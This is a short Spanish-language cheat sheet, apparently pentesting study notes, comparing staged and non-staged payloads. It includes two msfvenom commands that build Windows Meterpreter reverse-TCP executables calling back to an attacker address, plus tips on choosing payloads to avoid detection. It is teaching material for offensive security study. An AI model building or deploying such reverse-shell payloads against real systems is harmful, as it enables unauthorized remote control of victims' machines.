---

### 🎯 **Staged vs Non-Staged Payloads Cheat Sheet** 🎯

---
----
#### 📝 **¿Qué es un Payload Staged?**  
Un **payload staged** es un tipo de carga útil que se divide en **dos o más etapas**.  
- 🥇 **Primera Etapa:** Se envía un pequeño código inicial para establecer una conexión segura con el atacante.  
- 🥈 **Segunda Etapa:** Una vez que la conexión está establecida, se envía la carga útil completa.  

---

#### 🚀 **Ventajas de Payload Staged:**  
- ✅ **Menor detección:** La primera etapa suele ser pequeña, lo que facilita eludir sistemas de detección.  
- ✅ **Flexibilidad:** Permite cambiar la carga útil final según la situación.  
- ✅ **Ejecución remota:** La segunda etapa se recibe solo después de la conexión, lo que aumenta la persistencia.  

---

#### ❌ **Desventajas de Payload Staged:**  
- 🚩 **Dependencia de conexión:** Si la conexión falla, el ataque queda incompleto.  
- 🚩 **Complejidad:** Requiere más pasos y puede ser menos fiable en entornos de red restrictivos.  

---

### 📝 **¿Qué es un Payload Non-Staged?**  
Un **payload non-staged** se envía como una **única entidad** en un solo paquete.  
- 📦 **Carga Completa:** Todo el código malicioso se envía de una vez y se ejecuta inmediatamente.  

---

#### 🚀 **Ventajas de Payload Non-Staged:**  
- ✅ **Simplicidad:** El ataque es directo y rápido.  
- ✅ **Fiabilidad:** No depende de establecer una conexión adicional.  

---

#### ❌ **Desventajas de Payload Non-Staged:**  
- 🚩 **Mayor detección:** Todo el código malicioso se envía de una sola vez, lo que aumenta la probabilidad de ser detectado.  
- 🚩 **Menor flexibilidad:** No se puede modificar el payload después de enviarlo.  

---

### 💡 **Ejemplos de uso en Metasploit:**

#### 📂 **Payload Staged:**  
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > payload.exe
```
- **Staged Payload:** `windows/meterpreter/reverse_tcp`  
- El payload inicial establece la conexión y luego carga la segunda etapa.  

---

#### 🗃️ **Payload Non-Staged:**  
```bash
msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > payload.exe
```
- **Non-Staged Payload:** `windows/meterpreter_reverse_tcp`  
- El payload completo se envía y ejecuta directamente.  

---

### 💡 **¿Cuál usar?**  
- 🔒 **Ambientes con alta seguridad:** Prefiere *Staged* para evitar detecciones tempranas.  
- ⚡ **Ataques rápidos o entornos inseguros:** Usa *Non-Staged* para asegurar la ejecución sin conexiones adicionales.  

---

💾 **Guarda esta referencia en Obsidian para tener siempre a mano las diferencias entre Staged y Non-Staged Payloads!** 🚀